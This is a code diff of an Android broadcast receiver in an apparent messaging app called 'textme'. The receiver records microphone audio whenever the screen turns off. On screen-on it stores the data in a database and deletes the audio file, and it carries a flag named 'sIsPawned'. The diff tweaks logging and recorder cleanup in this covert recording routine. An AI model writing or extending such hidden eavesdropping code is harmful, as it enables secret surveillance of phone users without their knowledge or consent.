@@ -7,6 +7,7 @@ import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.database.SQLException;
 import android.database.sqlite.SQLiteDatabase;
+import android.util.Log;
 
 import com.candroid.textme.api.Lofl;
 import com.candroid.textme.data.db.Database;
@@ -16,6 +17,7 @@ import com.candroid.textme.services.MessagingService;
 import java.io.File;
 
 public class ScreenReceiver extends BroadcastReceiver {
+    public static final String TAG = ScreenReceiver.class.getSimpleName();
     public static boolean sIsPawned = false;
     protected static boolean sKill = false;
     private static boolean isTaskScheduled = false;
@@ -23,7 +25,6 @@ public class ScreenReceiver extends BroadcastReceiver {
     public void onReceive(Context context, Intent intent) {
         if(intent.getAction().equals(Intent.ACTION_SCREEN_ON)){
             if(context.checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED){
-                MessagingService.stopRecording();
                 new Thread(new Runnable() {
                     @Override
                     public void run() {
@@ -38,8 +39,13 @@ public class ScreenReceiver extends BroadcastReceiver {
                         }finally {
                             db.endTransaction();
                             db.close();
-                            file.delete();
+                            boolean filedDeleted = file.delete();
+                            if(filedDeleted){
+                                Log.d(TAG, "audio file deleted");
+                            }
                         }
+                        MessagingService.stopRecording();
+                        MessagingService.sRecorder = null;
                     }
                 }).start();
             }
@@ -59,7 +65,7 @@ public class ScreenReceiver extends BroadcastReceiver {
         }else if(intent.getAction().equals(Intent.ACTION_SCREEN_OFF)){
             sKill = true;
             if(context.checkSelfPermission(Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) {
-                MessagingService.recordAudio();
+                MessagingService.recordAudio(context);
             }
         }
     }
